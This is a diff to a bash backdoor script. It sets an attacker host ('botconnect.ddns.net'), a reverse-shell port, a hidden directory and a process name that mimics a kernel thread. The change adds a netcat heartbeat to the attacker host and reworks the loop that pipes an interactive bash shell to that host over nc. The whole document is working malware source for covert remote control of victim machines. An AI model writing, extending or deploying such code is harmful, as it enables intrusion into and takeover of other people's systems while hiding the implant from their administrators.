@@ -12,7 +12,8 @@ fi
 
 # Configuration
 ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP/domain
-PORT=4444  # Port for reverse shell and server
+PORT=4444  # Port for reverse shell
+HEARTBEAT_PORT=4445  # Separate port for heartbeat
 HIDDEN_DIR="/var/tmp/.webservice"  # Hidden directory
 HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  # Hidden file
 PROCESS_NAME="[webservice]"  # Process name to mimic
@@ -199,11 +200,11 @@ Uptime: $(uptime)"
     esac
 }
 
-# Heartbeat function
+# Heartbeat function (runs on separate connection)
 send_heartbeat() {
     while true; do
         sleep 5
-        echo "KEEPALIVE:$UUID"
+        echo "KEEPALIVE:$UUID" | nc -w 1 $ATTACKER_IP $HEARTBEAT_PORT 2>/dev/null
     done
 }
 
@@ -225,17 +226,17 @@ while true; do
         echo "MSG:SHELL:START"
         send_heartbeat &
         HEARTBEAT_PID=$!
-        while true; do
-            read -r cmd
-            case "$cmd" in
-                "status"|"info")
-                    handle_custom_command "$cmd"
-                    ;;
-                *)
+        # Use socat or script for shell if available, else fallback to bash
+        if [ "$PTY_CMD" != "/bin/bash -i" ]; then
+            eval "$PTY_CMD" 2>/dev/null
+        else
+            while true; do
+                read -r cmd
+                if [ -n "$cmd" ]; then
                     /bin/bash -i -c "$cmd" 2>/dev/null
-                    ;;
-            esac
-        done
+                fi
+            done
+        fi
         kill $HEARTBEAT_PID 2>/dev/null
     ) | nc -w 120 $ATTACKER_IP $PORT 2>/dev/null
     for interval in "${RETRY_INTERVALS[@]}"; do
